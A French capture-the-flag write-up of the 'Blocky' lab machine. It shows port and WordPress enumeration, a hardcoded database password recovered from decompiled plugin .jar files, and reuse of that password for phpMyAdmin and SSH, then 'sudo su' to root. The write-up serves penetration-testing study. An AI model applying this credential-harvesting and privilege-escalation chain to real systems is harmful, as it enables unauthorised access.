# Blocky [Linux] Easy

# — 1.Enumeration —

## Nmap

`nmap -sS -A -sC -sV -p- 10.10.10.37`

```bash
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
Apache/2.4.18 (Ubuntu)
WordPress 4.8
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
```

Énumération du Wordpress :

`nmap -p- --script http-wordpress-enum --script-args check-latest=true,search-limit=10 10.10.10.37` 

```bash
80/tcp    open   http
| http-wordpress-enum: 
| Search limited to top 10 themes/plugins
|   plugins
|     akismet 3.3.2 (latest version:4.2.4)
|   themes
|_    twentyfifteen 1.8
```

### Wpscan

`root@kali# wpscan --url http://10.10.10.37 -e ap,t,tt,u | tee scans/wpscan`

## FFUF

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.37/FUZZ           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.37/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 52256, Words: 3306, Lines: 314]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 52256, Words: 3306, Lines: 314]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 52256, Words: 3306, Lines: 314]
# Copyright 2007 James Fisher [Status: 200, Size: 52256, Words: 3306, Lines: 314]
# directory-list-2.3-medium.txt [Status: 200, Size: 52256, Words: 3306, Lines: 314]
#                       [Status: 200, Size: 52256, Words: 3306, Lines: 314]
#                       [Status: 200, Size: 52256, Words: 3306, Lines: 314]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 52256, Words: 3306, Lines: 314]
wiki                    [Status: 301, Size: 309, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 315, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 312, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 315, Words: 20, Lines: 10]
                        [Status: 200, Size: 52256, Words: 3306, Lines: 314]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
:: Progress: [220560/220560] :: Job [1/1] :: 3378 req/sec :: Duration: [0:01:16] :: Errors: 0 ::
```

[http://10.10.10.37/wiki/](http://10.10.10.37/wiki/) en construction

[http://10.10.10.37/](http://10.10.10.37/wiki/)wp-content rien

[http://10.10.10.37/plugins/](http://10.10.10.37/plugins/) deux fichier .jar

[http://10.10.10.37/wp-includes/](http://10.10.10.37/wp-includes/) Plein de fichier

[http://10.10.10.37/phpmyadmin/](http://10.10.10.37/phpmyadmin/) Accées à la BDD

## Plugins

Nous avons obtenu 2 fichier .jar sur [http://10.10.10.37/plugins](http://10.10.10.37/plugins) nous pouvons voir leurs code avec l’outil jd-gui 

```bash
public class BlockyCore {
  public String sqlHost = "localhost";
  public String sqlUser = "root";
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";

  public void onServerStart() {}
  public void onServerStop() {}
  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }
  public void sendMessage(String username, String message) {}
}
```

## PHPmyAdmin

Nous pouvons maintenant accéder à la base de données du site phpmyadmin avec les identifiants trouvé dans l’un des fichier .jar `root:8YsqfCTnvxAUeduzjNSXe22`

On trouve en utilisateur de la BDD `notch` on à donc un utilisateur et un mot de passe si on essaye le ssh avec l’utilisateur “notch” et le mot de passe de la bdd nous pouvons nous connecter au pc à distance.

# — 2.Privilege Escalation —

`sudo -l`

Le mot de passe de notch est toujours le même que pour les autres services `8YsqfCTnvxAUeduzjNSXe22` on se rend compte que nous pouvons exécuter toutes les commandes utilisateurs en tant que root.

`sudo su`

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# cat /home/root.txt
cat: /home/root.txt: No such file or directory
root@Blocky:/home/notch# cat /root/root.txt
```